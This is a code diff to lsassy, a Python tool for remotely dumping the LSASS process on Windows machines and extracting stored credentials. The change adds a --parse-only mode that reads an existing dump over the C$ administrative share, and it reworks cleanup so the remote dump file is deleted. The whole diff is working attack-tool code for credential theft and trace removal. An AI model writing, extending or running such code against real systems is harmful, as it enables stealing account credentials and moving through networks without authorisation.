@@ -8,6 +8,7 @@ from lsassy.parser import Parser
 from lsassy.session import Session
 from lsassy.writer import Writer
 from lsassy.dumper import Dumper
+from lsassy.impacketfile import ImpacketFile
 
 import pkg_resources
 
@@ -60,6 +61,12 @@ class TLsassy(Thread):
             if dump_path and dump_path[-1] != "\\":
                 dump_path += "\\"
 
+            parse_only = self.args.parse_only
+
+            if parse_only and (dump_path is None or self.args.dump_name is None):
+                logging.error("--dump-path and --dump-name required for --parse-only option")
+                exit(1)
+
             session = Session()
             session.get_session(
                 address=self.target,
@@ -79,19 +86,35 @@ class TLsassy(Thread):
                 logging.error("Couldn't connect to remote host")
                 exit(1)
 
-            dumper = Dumper(session).load(self.args.dump_method)
-            if dumper is None:
-                logging.error("Unable to load dump module")
-                exit(1)
+            if not parse_only:
+                dumper = Dumper(session).load(self.args.dump_method)
+                if dumper is None:
+                    logging.error("Unable to load dump module")
+                    exit(1)
 
-            file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods, dump_path=dump_path,
-                               dump_name=self.args.dump_name, timeout=self.args.timeout, **options)
+                file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods, dump_path=dump_path,
+                                   dump_name=self.args.dump_name, timeout=self.args.timeout, **options)
+                if file is None:
+                    logging.error("Unable to dump lsass.")
+                    exit(1)
+            else:
+                file = ImpacketFile(session).open(
+                    share="C$",
+                    path=dump_path,
+                    file=self.args.dump_name,
+                    timeout=self.args.timeout
+                )
+                if file is None:
+                    logging.error("Unable to open lsass dump.")
+                    exit(1)
 
-            if file is None:
-                logging.error("Unable to dump lsass.")
-                exit(1)
+            credentials = Parser(file).parse(parse_only=parse_only)
 
-            credentials = Parser(file).parse()
+            if not parse_only:
+                file.delete(timeout=self.args.timeout)
+                logging.debug("Lsass dump successfully deleted")
+            else:
+                logging.debug("Not deleting lsass dump as --parse-only was provided")
 
             if credentials is None:
                 logging.error("Unable to extract credentials from lsass. Cleaning.")
@@ -108,13 +131,7 @@ class TLsassy(Thread):
             logging.error("An unknown error has occurred.", exc_info=True)
         finally:
             try:
-                file.close()
-                logging.debug("Lsass handle closed")
-            except:
-                pass
-
-            try:
-                dumper.failsafe()
+                file.delete(timeout=self.args.timeout)
                 logging.debug("Lsass dump removed")
             except:
                 pass
@@ -146,7 +163,7 @@ def run():
     group_dump.add_argument('-O', '--options', action='store',
                             help='Dump module options (Example procdump_path=/opt/procdump.exe,procdump=procdump.exe')
     group_dump.add_argument('--timeout', action='store', type=int, default=5, help='Max time to wait for lsass dump (Default 5s)')
-    
+    group_dump.add_argument('--parse-only', action='store_true', help='Parse remote dump without dumping')
 
     group_auth = parser.add_argument_group('authentication')
     group_auth.add_argument('-u', '--username', action='store', help='Username')
